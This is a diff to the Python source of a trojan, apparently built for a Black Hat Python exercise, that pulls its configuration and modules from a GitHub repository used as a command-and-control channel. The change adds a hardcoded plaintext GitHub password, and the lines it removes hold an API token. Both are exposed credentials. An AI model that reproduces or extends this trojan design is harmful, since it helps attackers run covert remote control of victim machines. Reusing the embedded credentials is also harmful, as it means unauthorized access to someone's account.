@@ -10,13 +10,13 @@ import queue
 import threading
 import random
 import sys
-import _strptime
 import time
 
 #Define global variables
 gh_username = "aberlanga25"
+gh_password = "natacion3"
 gh_repo = "BlackHat"
-gh_remote = "data/"
+gh_remote = "Trojan/data/"
 
 #We generate a trojan_id. If this id is not available in our github config folder,
 #we will resort to using the default config file for this trojan.
@@ -51,7 +51,7 @@ class GitImporter(object):
 
 #Connect to Github Function and return its object, along with repository and branch objects
 def gh_connect():
-    gh = login(token="4560219cd4f2785f528e3ebc0f0845989ffc3820")
+    gh = login(username=gh_username, password=gh_password)
     repo = gh.repository(gh_username, gh_repo)
     branch = repo.branch("origin")
     return gh, repo, branch
@@ -60,14 +60,8 @@ def gh_connect():
 #If there is a problem or file is not found, return None
 def get_file_contents(file_path):
     gh, repo, branch = gh_connect()
-    if gh and repo and branch:
-        hash_list = branch.commit.commit.tree.recurse().tree
-        for hash in hash_list:
-            if file_path in hash.path:
-                file_contents_b64 = repo.blob(hash.sha).content
-                file_contents = base64.b64decode(file_contents_b64).decode("utf-8")
-                return file_contents
-    return None
+    contents = repo.file_contents(file_path)
+    return contents.decoded
 
 #Grab the file sha according to the path location.
 #If there is a problem or file is not found, return None
